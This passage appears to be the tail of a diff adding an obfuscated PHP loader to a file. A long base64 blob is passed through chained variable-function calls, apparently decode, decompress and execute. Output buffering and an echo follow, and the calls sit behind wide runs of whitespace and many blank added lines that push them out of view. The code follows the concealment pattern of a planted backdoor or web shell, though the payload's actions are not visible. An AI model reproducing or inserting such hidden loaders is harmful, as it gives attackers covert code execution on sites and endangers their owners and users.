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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
